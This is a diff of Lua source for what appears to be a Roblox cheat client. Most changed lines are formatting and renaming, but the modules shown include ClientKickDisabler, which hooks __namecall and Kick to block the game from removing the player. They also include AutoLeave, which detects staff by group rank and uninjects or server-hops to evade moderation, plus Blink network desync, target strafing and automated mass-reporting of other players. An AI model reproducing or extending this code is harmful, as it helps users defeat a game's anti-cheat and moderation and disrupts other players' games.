 		local lastlet = ""
-		for i,v in pairs(str:split("")) do 
+		for i,v in pairs(str:split("")) do
 			if v ~= lastlet then
-				newstr = newstr..v 
+				newstr = newstr..v
 				lastlet = v
 			end
 		end
@@ -4841,22 +5153,22 @@ runFunction(function()
 	local reporttableexact = {
 		L = "Bullying",
 	}
-	
+
 
 	local function findreport(msg)
 		local checkstr = removerepeat(msg:gsub("%W+", ""):lower())
-		for i,v in pairs(reporttable) do 
-			if checkstr:find(i) then 
+		for i,v in pairs(reporttable) do
+			if checkstr:find(i) then
 				return v, i
 			end
 		end
-		for i,v in pairs(reporttableexact) do 
-			if checkstr == i then 
+		for i,v in pairs(reporttableexact) do
+			if checkstr == i then
 				return v, i
 			end
 		end
-		for i,v in pairs(AutoReportList.ObjectList) do 
-			if checkstr:find(v) then 
+		for i,v in pairs(AutoReportList.ObjectList) do
+			if checkstr:find(v) then
 				return "Bullying", v
 			end
 		end
@@ -4865,16 +5177,16 @@ runFunction(function()
 
 	AutoReport = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
 		Name = "AutoReport",
-		Function = function(callback) 
-			if callback then 
-				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then 
+		Function = function(callback)
+			if callback then
+				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
 					table.insert(AutoReport.Connections, textChatService.MessageReceived:Connect(function(tab)
 						if tab.TextSource then
 							local plr = playersService:GetPlayerByUserId(tab.TextSource.UserId)
 							local args = tab.Text:split(" ")
-							if plr and plr ~= lplr and WhitelistFunctions:GetWhitelist(plr) == 0 then
+							if plr and plr ~= lplr and whitelist:get(plr) == 0 then
 								local reportreason, reportedmatch = findreport(tab.Text)
-								if reportreason then 
+								if reportreason then
 									if alreadyreported[plr] then return end
 									task.spawn(function()
 										if syn == nil or reportplayer then
@@ -4885,7 +5197,7 @@ runFunction(function()
 											end
 										end
 									end)
-									if AutoReportNotify.Enabled then 
+									if AutoReportNotify.Enabled then
 										warningNotification("AutoReport", "Reported "..plr.Name.." for "..reportreason..' ('..reportedmatch..')', 15)
 									end
 									alreadyreported[plr] = true
@@ -4893,14 +5205,14 @@ runFunction(function()
 							end
 						end
 					end))
-				else 
-					if replicatedStorageService:FindFirstChild("DefaultChatSystemChatEvents") then
-						table.insert(AutoReport.Connections, replicatedStorageService.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(tab, channel)
+				else
+					if replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
+						table.insert(AutoReport.Connections, replicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(tab, channel)
 							local plr = playersService:FindFirstChild(tab.FromSpeaker)
 							local args = tab.Message:split(" ")
-							if plr and plr ~= lplr and WhitelistFunctions:GetWhitelist(plr) == 0 then
+							if plr and plr ~= lplr and whitelist:get(plr) == 0 then
 								local reportreason, reportedmatch = findreport(tab.Message)
-								if reportreason then 
+								if reportreason then
 									if alreadyreported[plr] then return end
 									task.spawn(function()
 										if syn == nil or reportplayer then
@@ -4911,7 +5223,7 @@ runFunction(function()
 											end
 										end
 									end)
-									if AutoReportNotify.Enabled then 
+									if AutoReportNotify.Enabled then
 										warningNotification("AutoReport", "Reported "..plr.Name.." for "..reportreason..' ('..reportedmatch..')', 15)
 									end
 									alreadyreported[plr] = true
@@ -4936,7 +5248,7 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local targetstrafe = {Enabled = false}
 	local targetstraferange = {Value = 0}
 	local oldmove
@@ -4956,7 +5268,7 @@ runFunction(function()
 							WallCheck = false,
 							AimPart = "RootPart"
 						})
-						if plr then 
+						if plr then
 							facecam = false
 							--code stolen from roblox since the way I tried to make it apparently sucks
 							local c, s
@@ -4994,7 +5306,7 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local AutoLeave = {Enabled = false}
 	local AutoLeaveMode = {Value = "UnInject"}
 	local AutoLeaveGroupId = {Value = "0"}
@@ -5006,12 +5318,12 @@ runFunction(function()
 		local decodeddata = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Desc&limit=100"..(pointer and "&cursor="..pointer or "")))
 		local chosenServer
 		for i, v in pairs(decodeddata.data) do
-			if (tonumber(v.playing) < tonumber(playersService.MaxPlayers)) and tonumber(v.ping) < 300 and v.id ~= game.JobId then 
+			if (tonumber(v.playing) < tonumber(playersService.MaxPlayers)) and tonumber(v.ping) < 300 and v.id ~= game.JobId then
 				chosenServer = v.id
 				break
 			end
 		end
-		if chosenServer then 
+		if chosenServer then
 			alreadyjoining = false
 			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, chosenServer, lplr)
 		else
@@ -5025,7 +5337,7 @@ runFunction(function()
 
 	local function getRole(plr, id)
 		local suc, res = pcall(function() return plr:GetRankInGroup(id) end)
-		if not suc then 
+		if not suc then
 			repeat
 				suc, res = pcall(function() return plr:GetRankInGroup(id) end)
 				task.wait()
@@ -5039,12 +5351,11 @@ runFunction(function()
 			pcall(function()
 				if AutoLeaveGroupId.Value == "" or AutoLeaveRank.Value == "" then return end
 				if getRole(plr, tonumber(AutoLeaveGroupId.Value) or 0) >= (tonumber(AutoLeaveRank.Value) or 1) then
-					WhitelistFunctions.CustomTags[plr.Name] = "[GAME STAFF] "
 					local _, ent = entityLibrary.getEntityFromPlayer(plr)
-					if ent then 
+					if ent then
 						entityLibrary.entityUpdatedEvent:Fire(ent)
 					end
-					if AutoLeaveMode.Value == "UnInject" then 
+					if AutoLeaveMode.Value == "UnInject" then
 						task.spawn(function()
 							if not shared.VapeFullyLoaded then
 								repeat task.wait() until shared.VapeFullyLoaded
@@ -5056,7 +5367,7 @@ runFunction(function()
 							Text = "Staff Detected\n"..(plr.DisplayName and plr.DisplayName.." ("..plr.Name..")" or plr.Name),
 							Duration = 60,
 						})
-					elseif AutoLeaveMode.Value == "Rejoin" then 
+					elseif AutoLeaveMode.Value == "Rejoin" then
 						getrandomserver()
 					else
 						createwarning("AutoLeave", "Staff Detected : "..(plr.DisplayName and plr.DisplayName.." ("..plr.Name..")" or plr.Name), 60)
@@ -5068,9 +5379,9 @@ runFunction(function()
 
 	local function autodetect(roles)
 		local highest = 9e9
-		for i,v in pairs(roles) do 
+		for i,v in pairs(roles) do
 			local low = v.Name:lower()
-			if (low:find("admin") or low:find("mod") or low:find("dev")) and v.Rank < highest then 
+			if (low:find("admin") or low:find("mod") or low:find("dev")) and v.Rank < highest then
 				highest = v.Rank
 			end
 		end
@@ -5080,23 +5391,23 @@ runFunction(function()
 	AutoLeave = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
 		Name = "AutoLeave",
 		Function = function(callback)
-			if callback then 
-				if AutoLeaveGroupId.Value == "" or AutoLeaveRank.Value == "" then 
+			if callback then
+				if AutoLeaveGroupId.Value == "" or AutoLeaveRank.Value == "" then
 					task.spawn(function()
 						local placeinfo = {Creator = {CreatorTargetId = tonumber(AutoLeaveGroupId.Value)}}
 						if AutoLeaveGroupId.Value == "" then
 							placeinfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
-							if placeinfo.Creator.CreatorType ~= "Group" then 
+							if placeinfo.Creator.CreatorType ~= "Group" then
 								local desc = placeinfo.Description:split("\n")
-								for i, str in pairs(desc) do 
+								for i, str in pairs(desc) do
 									local _, begin = str:find("roblox.com/groups/")
-									if begin then 
+									if begin then
 										local endof = str:find("/", begin + 1)
 										placeinfo = {Creator = {CreatorType = "Group", CreatorTargetId = str:sub(begin + 1, endof - 1)}}
 									end
 								end
 							end
-							if placeinfo.Creator.CreatorType ~= "Group" then 
+							if placeinfo.Creator.CreatorType ~= "Group" then
 								warningNotification("AutoLeave", "Automatic Setup Failed (no group detected)", 60)
 								return
 							end
@@ -5110,18 +5421,8 @@ runFunction(function()
 						end
 					end)
 					table.insert(AutoLeave.Connections, playersService.PlayerAdded:Connect(autoleaveplradded))
-					for i, plr in pairs(playersService:GetPlayers()) do 
+					for i, plr in pairs(playersService:GetPlayers()) do
 						autoleaveplradded(plr)
-					end
-				end
-			else
-				for i,v in pairs(WhitelistFunctions.CustomTags) do 
-					if v == "[GAME STAFF] " then 
-						WhitelistFunctions.CustomTags[i] = nil
-						local _, ent = entityLibrary.getEntityFromPlayer(i)
-						if ent then 
-							entityLibrary.entityUpdatedEvent:Fire(ent)
-						end
 					end
 				end
 			end
@@ -5145,17 +5446,17 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
-		Name = "AntiVoid", 
+		Name = "AntiVoid",
 		Function = function(callback)
-			if callback then 
+			if callback then
 				local rayparams = RaycastParams.new()
 				rayparams.RespectCanCollide = true
 				local lastray
 				RunLoops:BindToHeartbeat("AntiVoid", function()
 					if entityLibrary.isAlive then
-						rayparams.FilterDescendantsInstances = {gameCamera, lplr.Character} 
+						rayparams.FilterDescendantsInstances = {gameCamera, lplr.Character}
 						lastray = entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air and entityLibrary.character.HumanoidRootPart.CFrame or lastray
 						if (entityLibrary.character.HumanoidRootPart.Position.Y + (entityLibrary.character.HumanoidRootPart.Velocity.Y * 0.016)) <= (workspace.FallenPartsDestroyHeight + 5) then
 							local comp = {entityLibrary.character.HumanoidRootPart.CFrame:GetComponents()}
@@ -5177,15 +5478,15 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local Blink = {Enabled = false}
 	Blink = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
 		Name = "Blink",
 		Function = function(callback)
-			if callback then 
+			if callback then
 				if sethiddenproperty then
 					RunLoops:BindToHeartbeat("Blink", function()
-						if entityLibrary.isAlive then 
+						if entityLibrary.isAlive then
 							sethiddenproperty(entityLibrary.character.HumanoidRootPart, "NetworkIsSleeping", true)
 						end
 					end)
@@ -5200,7 +5501,7 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local AnimationPlayer = {Enabled = false}
 	local AnimationPlayerBox = {Value = ""}
 	local AnimationPlayerSpeed = {Speed = 1}
@@ -5208,12 +5509,12 @@ runFunction(function()
 	AnimationPlayer = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
 		Name = "AnimationPlayer",
 		Function = function(callback)
-			if callback then 
-				if entityLibrary.isAlive then 
-					if playedanim then 
-						playedanim:Stop() 
+			if callback then
+				if entityLibrary.isAlive then
+					if playedanim then
+						playedanim:Stop()
 						playedanim.Animation:Destroy()
-						playedanim = nil 
+						playedanim = nil
 					end
 					local anim = Instance.new("Animation")
 					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
@@ -5241,10 +5542,10 @@ runFunction(function()
 					repeat task.wait() until entityLibrary.isAlive or not AnimationPlayer.Enabled
 					task.wait(0.5)
 					if not AnimationPlayer.Enabled then return end
-					if playedanim then 
-						playedanim:Stop() 
+					if playedanim then
+						playedanim:Stop()
 						playedanim.Animation:Destroy()
-						playedanim = nil 
+						playedanim = nil
 					end
 					local anim = Instance.new("Animation")
 					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
@@ -5276,8 +5577,8 @@ runFunction(function()
 	AnimationPlayerBox = AnimationPlayer.CreateTextBox({
 		Name = "Animation",
 		TempText = "anim (num only)",
-		Function = function(enter) 
-			if enter and AnimationPlayer.Enabled then 
+		Function = function(enter)
+			if enter and AnimationPlayer.Enabled then
 				AnimationPlayer.ToggleButton(false)
 				AnimationPlayer.ToggleButton(false)
 			end
@@ -5286,7 +5587,7 @@ runFunction(function()
 	AnimationPlayerSpeed = AnimationPlayer.CreateSlider({
 		Name = "Speed",
 		Function = function(val)
-			if playedanim then 
+			if playedanim then
 				playedanim:AdjustSpeed(val / 10)
 			end
 		end,
@@ -5296,7 +5597,7 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local GamingChair = {Enabled = false}
 	local GamingChairColor = {Value = 1}
 	local chair
@@ -5313,7 +5614,7 @@ runFunction(function()
 	GamingChair = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
 		Name = "GamingChair",
 		Function = function(callback)
-			if callback then 
+			if callback then
 				chair = Instance.new("MeshPart")
 				chair.Color = Color3.fromRGB(21, 21, 21)
 				chair.Size = Vector3.new(2.16, 3.6, 2.3) / Vector3.new(12.37, 20.636, 13.071)
@@ -5334,7 +5635,7 @@ runFunction(function()
 				local chairweld = Instance.new("WeldConstraint")
 				chairweld.Part0 = chair
 				chairweld.Parent = chair
-				if entityLibrary.isAlive then 
+				if entityLibrary.isAlive then
 					chair.CFrame = entityLibrary.character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(-90), 0)
 					chairweld.Part1 = entityLibrary.character.HumanoidRootPart
 				end
@@ -5372,7 +5673,7 @@ runFunction(function()
 				chairfan.CanCollide = false
 				chairfan.Parent = chair
 				local trails = {}
-				for i,v in pairs(wheelpositions) do 
+				for i,v in pairs(wheelpositions) do
 					local attachment = Instance.new("Attachment")
 					attachment.Position = v
 					attachment.Parent = chairlegs
@@ -5400,7 +5701,7 @@ runFunction(function()
 						task.wait()
 						if not GamingChair.Enabled then break end
 						if entityLibrary.isAlive and entityLibrary.character.Humanoid.Health > 0 then
-							if not chairanim.IsPlaying then 
+							if not chairanim.IsPlaying then
 								local temp2 = Instance.new("Animation")
 								temp2.AnimationId = entityLibrary.character.Humanoid.RigType == Enum.HumanoidRigType.R15 and "http://www.roblox.com/asset/?id=2506281703" or "http://www.roblox.com/asset/?id=178130996"
 								chairanim = entityLibrary.character.Humanoid:LoadAnimation(temp2)
@@ -5417,34 +5718,34 @@ runFunction(function()
 							chairfan.CFrame = chair.CFrame * CFrame.new(0.047, -1.873, 0) * CFrame.Angles(0, math.rad(tick() * 180 % 360), math.rad(180))
 							local moving = entityLibrary.character.Humanoid:GetState() == Enum.HumanoidStateType.Running and entityLibrary.character.Humanoid.MoveDirection ~= Vector3.zero
 							local flying = GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled or GuiLibrary.ObjectsThatCanBeSaved.LongJumpOptionsButton and GuiLibrary.ObjectsThatCanBeSaved.LongJumpOptionsButton.Api.Enabled or GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton and GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled
-							if movingsound.TimePosition > 1.9 then 
+							if movingsound.TimePosition > 1.9 then
 								movingsound.TimePosition = 0.2
 							end
 							movingsound.PlaybackSpeed = (entityLibrary.character.HumanoidRootPart.Velocity * Vector3.new(1, 0, 1)).Magnitude / 16
-							for i,v in pairs(trails) do 
+							for i,v in pairs(trails) do
 								v.Enabled = not flying and moving
 								v.Color = ColorSequence.new(movingsound.PlaybackSpeed > 1.5 and Color3.new(1, 0.5, 0) or Color3.new())
 							end
-							if moving ~= oldmoving then 
-								if movingsound.IsPlaying then 
+							if moving ~= oldmoving then
+								if movingsound.IsPlaying then
 									if not moving then movingsound:Stop() end
 								else
 									if not flying and moving then movingsound:Play() end
 								end
 								oldmoving = moving
 							end
-							if flying ~= oldflying then 
-								if flying then 
-									if movingsound.IsPlaying then 
+							if flying ~= oldflying then
+								if flying then
+									if movingsound.IsPlaying then
 										movingsound:Stop()
 									end
-									if not flyingsound.IsPlaying then 
+									if not flyingsound.IsPlaying then
 										flyingsound:Play()
 									end
 									if currenttween then currenttween:Cancel() end
 									tween = tweenService:Create(chairlegs, TweenInfo.new(0.15), {Size = Vector3.zero})
 									tween.Completed:Connect(function(state)
-										if state == Enum.PlaybackState.Completed then 
+										if state == Enum.PlaybackState.Completed then
 											chairfan.Transparency = 0
 											chairlegs.Transparency = 1
 											tween = tweenService:Create(chairfan, TweenInfo.new(0.15), {Size = Vector3.new(1.534, 0.328, 1.537) / Vector3.new(791.138, 168.824, 792.027)})
@@ -5453,16 +5754,16 @@ runFunction(function()
 									end)
 									tween:Play()
 								else
-									if flyingsound.IsPlaying then 
+									if flyingsound.IsPlaying then
 										flyingsound:Stop()
 									end
-									if not movingsound.IsPlaying and moving then 
+									if not movingsound.IsPlaying and moving then
 										movingsound:Play()
 									end
 									if currenttween then currenttween:Cancel() end
 									tween = tweenService:Create(chairfan, TweenInfo.new(0.15), {Size = Vector3.zero})
 									tween.Completed:Connect(function(state)
-										if state == Enum.PlaybackState.Completed then 
+										if state == Enum.PlaybackState.Completed then
 											chairfan.Transparency = 1
 											chairlegs.Transparency = 0
 											tween = tweenService:Create(chairlegs, TweenInfo.new(0.15), {Size = Vector3.new(1.8, 1.2, 1.8) / Vector3.new(10.432, 8.105, 9.488)})
@@ -5496,14 +5797,14 @@ runFunction(function()
 	GamingChairColor = GamingChair.CreateColorSlider({
 		Name = "Color",
 		Function = function(h, s, v)
-			if chairhighlight then 
+			if chairhighlight then
 				chairhighlight.OutlineColor = Color3.fromHSV(h, s, v)
 			end
 		end
 	})
 end)
 
-runFunction(function()
+run(function()
 	local SongBeats = {Enabled = false}
 	local SongBeatsList = {ObjectList = {}}
 	local SongTween
@@ -5513,7 +5814,7 @@ runFunction(function()
 	local function PlaySong(arg)
 		local args = arg:split(":")
 		local song = isfile(args[1]) and getcustomasset(args[1]) or tonumber(args[1]) and "rbxassetid://"..args[1]
-		if not song then 
+		if not song then
 			warningNotification("SongBeats", "missing music file "..args[1], 5)
 			SongBeats.ToggleButton(false)
 			return
@@ -5524,7 +5825,7 @@ runFunction(function()
 		SongAudio.Parent = workspace
 		SongAudio:Play()
 		repeat
-			repeat task.wait() until SongAudio.IsLoaded or (not SongBeats.Enabled) 
+			repeat task.wait() until SongAudio.IsLoaded or (not SongBeats.Enabled)
 			if (not SongBeats.Enabled) then break end
 			gameCamera.FieldOfView = SongFOV - 5
 			if SongTween then SongTween:Cancel() end
@@ -5537,10 +5838,10 @@ runFunction(function()
 	SongBeats = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
 		Name = "SongBeats",
 		Function = function(callback)
-			if callback then 
+			if callback then
 				SongFOV = gameCamera.FieldOfView
 				task.spawn(function()
-					if #SongBeatsList.ObjectList <= 0 then 
+					if #SongBeatsList.ObjectList <= 0 then
 						warningNotification("SongBeats", "no songs", 5)
 						SongBeats.ToggleButton(false)
 						return
@@ -5568,7 +5869,7 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local Atmosphere = {Enabled = false}
 	local SkyUp = {Value = ""}
 	local SkyDown = {Value = ""}
@@ -5585,9 +5886,9 @@ runFunction(function()
 	Atmosphere = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
 		Name = "Atmosphere",
 		Function = function(callback)
-			if callback then 
-				for i,v in pairs(lightingService:GetChildren()) do 
-					if v:IsA("PostEffect") or v:IsA("Sky") then 
+			if callback then
+				for i,v in pairs(lightingService:GetChildren()) do
+					if v:IsA("PostEffect") or v:IsA("Sky") then
 						table.insert(oldobjects, v)
 						v.Parent = game
 					end
@@ -5608,7 +5909,7 @@ runFunction(function()
 			else
 				if skyobj then skyobj:Destroy() end
 				if skyatmosphereobj then skyatmosphereobj:Destroy() end
-				for i,v in pairs(oldobjects) do 
+				for i,v in pairs(oldobjects) do
 					v.Parent = lightingService
 				end
 				table.clear(oldobjects)
@@ -5618,8 +5919,8 @@ runFunction(function()
 	SkyUp = Atmosphere.CreateTextBox({
 		Name = "SkyUp",
 		TempText = "Sky Top ID",
-		FocusLost = function(enter) 
-			if Atmosphere.Enabled then 
+		FocusLost = function(enter)
+			if Atmosphere.Enabled then
 				Atmosphere.ToggleButton(false)
 				Atmosphere.ToggleButton(false)
 			end
@@ -5628,8 +5929,8 @@ runFunction(function()
 	SkyDown = Atmosphere.CreateTextBox({
 		Name = "SkyDown",
 		TempText = "Sky Bottom ID",
-		FocusLost = function(enter) 
-			if Atmosphere.Enabled then 
+		FocusLost = function(enter)
+			if Atmosphere.Enabled then
 				Atmosphere.ToggleButton(false)
 				Atmosphere.ToggleButton(false)
 			end
@@ -5638,8 +5939,8 @@ runFunction(function()
 	SkyLeft = Atmosphere.CreateTextBox({
 		Name = "SkyLeft",
 		TempText = "Sky Left ID",
-		FocusLost = function(enter) 
-			if Atmosphere.Enabled then 
+		FocusLost = function(enter)
+			if Atmosphere.Enabled then
 				Atmosphere.ToggleButton(false)
 				Atmosphere.ToggleButton(false)
 			end
@@ -5648,8 +5949,8 @@ runFunction(function()
 	SkyRight = Atmosphere.CreateTextBox({
 		Name = "SkyRight",
 		TempText = "Sky Right ID",
-		FocusLost = function(enter) 
-			if Atmosphere.Enabled then 
+		FocusLost = function(enter)
+			if Atmosphere.Enabled then
 				Atmosphere.ToggleButton(false)
 				Atmosphere.ToggleButton(false)
 			end
@@ -5658,8 +5959,8 @@ runFunction(function()
 	SkyFront = Atmosphere.CreateTextBox({
 		Name = "SkyFront",
 		TempText = "Sky Front ID",
-		FocusLost = function(enter) 
-			if Atmosphere.Enabled then 
+		FocusLost = function(enter)
+			if Atmosphere.Enabled then
 				Atmosphere.ToggleButton(false)
 				Atmosphere.ToggleButton(false)
 			end
@@ -5668,8 +5969,8 @@ runFunction(function()
 	SkyBack = Atmosphere.CreateTextBox({
 		Name = "SkyBack",
 		TempText = "Sky Back ID",
-		FocusLost = function(enter) 
-			if Atmosphere.Enabled then 
+		FocusLost = function(enter)
+			if Atmosphere.Enabled then
 				Atmosphere.ToggleButton(false)
 				Atmosphere.ToggleButton(false)
 			end
@@ -5678,8 +5979,8 @@ runFunction(function()
 	SkySun = Atmosphere.CreateTextBox({
 		Name = "SkySun",
 		TempText = "Sky Sun ID",
-		FocusLost = function(enter) 
-			if Atmosphere.Enabled then 
+		FocusLost = function(enter)
+			if Atmosphere.Enabled then
 				Atmosphere.ToggleButton(false)
 				Atmosphere.ToggleButton(false)
 			end
@@ -5688,8 +5989,8 @@ runFunction(function()
 	SkyMoon = Atmosphere.CreateTextBox({
 		Name = "SkyMoon",
 		TempText = "Sky Moon ID",
-		FocusLost = function(enter) 
-			if Atmosphere.Enabled then 
+		FocusLost = function(enter)
+			if Atmosphere.Enabled then
 				Atmosphere.ToggleButton(false)
 				Atmosphere.ToggleButton(false)
 			end
@@ -5698,31 +5999,31 @@ runFunction(function()
 	SkyColor = Atmosphere.CreateColorSlider({
 		Name = "Color",
 		Function = function(h, s, v)
-			if skyatmosphereobj then 
+			if skyatmosphereobj then
 				skyatmosphereobj.TintColor = Color3.fromHSV(SkyColor.Hue, SkyColor.Sat, SkyColor.Value)
 			end
 		end
 	})
 end)
 
-runFunction(function()
+run(function()
 	local Disabler = {Enabled = false}
 	local DisablerAntiKick = {Enabled = false}
 	local disablerhooked = false
 
 	local hookmethod = function(self)
 		if (not Disabler.Enabled) then return end
-		if type(self) == "userdata" and self == lplr then 
+		if type(self) == "userdata" and self == lplr then
 			return true
 		end
 	end
-	
+
 
 	Disabler = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
 		Name = "ClientKickDisabler",
 		Function = function(callback)
-			if callback then 
-				if not disablerhooked then 
+			if callback then
+				if not disablerhooked then
 					disablerhooked = true
 					local oldnamecall
 					oldnamecall = hookmetamethod(game, "__namecall", function(self, ...)
@@ -5737,14 +6038,14 @@ runFunction(function()
 					local antikick
 					antikick = hookfunction(lplr.Kick, function(self, ...)
 						if not Disabler.Enabled then return antikick(self, ...) end
-						if type(self) == "userdata" and self == lplr then 
+						if type(self) == "userdata" and self == lplr then
 							return
 						end
 						return antikick(self, ...)
 					end)
 				end
 			else
-				if restorefunction then 
+				if restorefunction then
 					restorefunction(lplr.Kick)
 					restorefunction(getrawmetatable(game).__namecall)
 					disablerhooked = false
@@ -5754,13 +6055,13 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local FPS = {}
 	local FPSLabel
 	FPS = GuiLibrary.CreateLegitModule({
 		Name = "FPS",
 		Function = function(callback)
-			if callback then 
+			if callback then
 				local frames = {}
 				local framerate = 0
 				local startClock = os.clock()
@@ -5772,7 +6073,7 @@ runFunction(function()
 						frames[i + 1] = frames[i] >= updateClock - 1 and frames[i] or nil
 					end
 					frames[1] = updateClock
-					if updateTick < tick() then 
+					if updateTick < tick() then
 						updateTick = tick() + 1
 						FPSLabel.Text = math.floor(os.clock() - startClock >= 1 and #frames or #frames / (os.clock() - startClock)).." FPS"
 					end
@@ -5797,15 +6098,15 @@ runFunction(function()
 end)
 
 
-runFunction(function()
+run(function()
 	local Ping = {}
 	local PingLabel
 	Ping = GuiLibrary.CreateLegitModule({
 		Name = "Ping",
 		Function = function(callback)
-			if callback then 
+			if callback then
 				task.spawn(function()
-					repeat 
+					repeat
 						PingLabel.Text = math.floor(tonumber(game:GetService("Stats"):FindFirstChild("PerformanceStats").Ping:GetValue())).." ms"
 						task.wait(1)
 					until false
@@ -5827,7 +6128,7 @@ runFunction(function()
 	PingCorner.Parent = PingLabel
 end)
 
-runFunction(function()
+run(function()
 	local Keystrokes = {}
 	local keys = {}
 	local keystrokesframe
@@ -5862,10 +6163,10 @@ runFunction(function()
 	Keystrokes = GuiLibrary.CreateLegitModule({
 		Name = "Keystrokes",
 		Function = function(callback)
-			if callback then 
+			if callback then
 				keyconnection1 = inputService.InputBegan:Connect(function(inputType)
 					local key = keys[inputType.KeyCode]
-					if key then 
+					if key then
 						if key.Tween then key.Tween:Cancel() end
 						if key.Tween2 then key.Tween2:Cancel() end
 						key.Tween = tweenService:Create(key.Key, TweenInfo.new(0.1), {BackgroundColor3 = Color3.new(1, 1, 1), BackgroundTransparency = 0})
@@ -5876,7 +6177,7 @@ runFunction(function()
 				end)
 				keyconnection2 = inputService.InputEnded:Connect(function(inputType)
 					local key = keys[inputType.KeyCode]
-					if key then 
+					if key then
 						if key.Tween then key.Tween:Cancel() end
 						if key.Tween2 then key.Tween2:Cancel() end
 						key.Tween = tweenService:Create(key.Key, TweenInfo.new(0.1), {BackgroundColor3 = Color3.new(), BackgroundTransparency = 0.5})
